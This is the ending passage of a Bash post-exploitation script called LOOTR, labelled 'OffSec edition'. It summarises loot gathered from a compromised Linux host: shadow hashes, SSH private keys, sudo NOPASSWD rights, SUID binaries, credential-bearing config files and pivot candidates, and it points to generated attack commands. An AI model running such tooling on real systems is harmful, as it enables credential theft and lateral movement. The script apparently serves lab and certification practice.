        echo -e "${RED}${BOLD}  ║  ★ ATTACK COMMANDS READY — START HERE:                   ║${NC}"
        echo -e "${RED}${BOLD}  ║    cat ${acfile}${NC}"
        echo -e "${RED}${BOLD}  ╚════════════════════════════════════════════════════════════╝${NC}"
    fi
}

#==============================================================================
# SUMMARY GENERATION
#==============================================================================
generate_summary() {
    info "Generating summary.txt..."
    local sfile="${OUTDIR}/summary.txt"
    local cred_count=""
    local keycount=0
    local kf=""
    local common_suid="ping|su$|sudo|passwd|newgrp|chfn|chsh|gpasswd|pkexec|mount|umount"
    local pf=""

    # Count SSH keys before the redirect block
    for kf in "${OUTDIR}/creds/key_"*; do
        [[ -f "${kf}" ]] || continue
        keycount=$((keycount + 1))
    done
    cred_count="$(find "${OUTDIR}/creds/" -maxdepth 1 -type f 2>/dev/null | wc -l)"

    {
        echo "============================================================"
        echo "  LOOTR SUMMARY — ${HOSTNAME_SHORT}"
        echo "  Generated: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "  Running as: $(id 2>/dev/null || echo 'unknown')"
        echo "============================================================"
        echo ""

        # Proof flags
        echo "[ PROOF FLAGS ]"
        echo "------------------------------------------------------------"
        if find "${OUTDIR}/proof" -maxdepth 1 -name "*.txt" -not -name "*.meta" 2>/dev/null | grep -q .; then
            while IFS= read -r pf; do
                echo "  Flag: $(basename "${pf}")"
                echo "  Content: $(tr -d '\n' < "${pf}" 2>/dev/null)"
                echo ""
            done < <(find "${OUTDIR}/proof" -maxdepth 1 -name "*.txt" -not -name "*.meta" 2>/dev/null)
        else
            echo "  No proof flags found"
        fi
        echo ""

        # Credentials found
        echo "[ CREDENTIALS ]"
        echo "------------------------------------------------------------"
        if [[ -r "${OUTDIR}/creds/shadow.txt" ]]; then
            echo "  [!] /etc/shadow was readable — hashes in creds/shadow_hashes.txt"
            echo "  NEXT → crack: see next_steps.txt [ SHADOW HASH CRACKING ]"
        fi
        if [[ -r "${OUTDIR}/creds/passwd.txt" ]]; then
            echo "  [*] /etc/passwd copied to creds/passwd.txt"
        fi
        echo "  Total credential files collected: ${cred_count}"
        echo ""

        # SSH keys
        echo "[ SSH KEYS ]"
        echo "------------------------------------------------------------"
        if [[ ${keycount} -eq 0 ]]; then
            echo "  No SSH private keys found"
        else
            for kf in "${OUTDIR}/creds/key_"*; do
                [[ -f "${kf}" ]] || continue
                echo "  ${kf}"
            done
            echo "  NEXT → ssh commands: see next_steps.txt [ SSH KEY ]"
        fi
        echo ""

        # Sudo NOPASSWD
        echo "[ SUDO NOPASSWD ]"
        echo "------------------------------------------------------------"
        if [[ -r "${OUTDIR}/system/sudo_rights.txt" ]]; then
            local nopasswd_found
            nopasswd_found=$(grep -i "NOPASSWD" "${OUTDIR}/system/sudo_rights.txt" 2>/dev/null)
            if [[ -n "${nopasswd_found}" ]]; then
                while IFS= read -r nopasswd_line; do
                    printf '  %s\n' "$nopasswd_line"
                done <<< "${nopasswd_found}"
                echo "  NEXT → exploit commands: see next_steps.txt [ SUDO NOPASSWD ]"
            else
                echo "  No NOPASSWD entries"
            fi
        else
            echo "  sudo output not available"
        fi
        echo ""

        # Internal listeners
        echo "[ INTERNAL LISTENERS (127.0.0.1 — pivot candidates) ]"
        echo "------------------------------------------------------------"
        if [[ -s "${OUTDIR}/network/internal_listeners.txt" ]]; then
            sed 's/^/  /' "${OUTDIR}/network/internal_listeners.txt" 2>/dev/null
            echo "  NEXT → tunnel commands: see next_steps.txt [ INTERNAL LISTENERS ]"
        else
            echo "  None identified"
        fi
        echo ""

        # SUID — filter common legit ones
        echo "[ SUID BINARIES (non-standard) ]"
        echo "------------------------------------------------------------"
        if [[ -s "${OUTDIR}/files/suid_binaries.txt" ]]; then
            local suid_interesting
            suid_interesting=$(grep -vE "${common_suid}" "${OUTDIR}/files/suid_binaries.txt" 2>/dev/null)
            if [[ -n "${suid_interesting}" ]]; then
                while IFS= read -r suid_line; do
                    printf '  %s\n' "$suid_line"
                done <<< "${suid_interesting}"
                echo "  NEXT → GTFObins hints: see next_steps.txt [ SUID BINARIES ]"
            else
                echo "  Only common/expected SUID binaries found"
            fi
        else
            echo "  SUID list not available"
        fi
        echo ""

        # File capabilities
        echo "[ FILE CAPABILITIES ]"
        echo "------------------------------------------------------------"
        if [[ -s "${OUTDIR}/files/capabilities.txt" ]]; then
            sed 's/^/  /' "${OUTDIR}/files/capabilities.txt" 2>/dev/null
            echo "  NEXT → exploit commands: see next_steps.txt [ FILE CAPABILITIES ]"
        else
            echo "  No special capabilities found"
        fi
        echo ""

        # High-value cred files
        echo "[ HIGH-VALUE CREDENTIAL FILES ]"
        echo "------------------------------------------------------------"
        if [[ -s "${OUTDIR}/creds/config_files_with_creds.txt" ]]; then
            head -20 "${OUTDIR}/creds/config_files_with_creds.txt" 2>/dev/null | sed 's/^/  /'
        else
            echo "  None found"
        fi
        echo ""

        # Reachable subnets
        echo "[ REACHABLE SUBNETS ]"
        echo "------------------------------------------------------------"
        if [[ -s "${OUTDIR}/network/reachable_subnets.txt" ]]; then
            sed 's/^/  /' "${OUTDIR}/network/reachable_subnets.txt" 2>/dev/null
        else
            echo "  Route info not available"
        fi
        echo ""

        echo "============================================================"
        echo "  Full data:       ${OUTDIR}/"
        echo "  Next steps:      ${OUTDIR}/next_steps.txt  ← START HERE"
        echo "  Legacy alias:    ${OUTDIR}/attack_commands.txt"
        echo "============================================================"

    } > "${sfile}"

    success "Summary written → ${sfile}"
    echo ""
    cat "${sfile}"

    # Generate attack commands file from findings
    generate_attack_commands
}

#==============================================================================
# MAIN
#==============================================================================
echo -e "\n${CYAN}${BOLD}"
echo "  ██╗      ██████╗  ██████╗ ████████╗██████╗ "
echo "  ██║     ██╔═══██╗██╔═══██╗╚══██╔══╝██╔══██╗"
echo "  ██║     ██║   ██║██║   ██║   ██║   ██████╔╝"
echo "  ██║     ██║   ██║██║   ██║   ██║   ██╔══██╗"
echo "  ███████╗╚██████╔╝╚██████╔╝   ██║   ██║  ██║"
echo "  ╚══════╝ ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═╝"
echo -e "${NC}"
info "Post-exploitation loot collection — OffSec edition"
info "Enumeration/collection only — no exploitation"
echo ""

if [[ -n "${SINGLE_PHASE}" ]]; then
    case "${SINGLE_PHASE}" in
        proof)   phase_proof ;;
        system)  phase_system ;;
        creds)   phase_creds ;;
        network) phase_network ;;
        files)   phase_files ;;
        procs)   phase_procs ;;
    esac
else
    phase_proof
    phase_system
    phase_creds
    phase_network
    phase_files
    if [[ "${QUICK_MODE}" == "true" ]]; then
        warn "Skipping processes phase (--quick mode)"
    else
        phase_procs
    fi
fi

generate_summary

echo ""
success "Loot collection complete. Output: ${OUTDIR}/"
success "Quick review: cat ${OUTDIR}/summary.txt"
success "Next steps:  cat ${OUTDIR}/next_steps.txt"
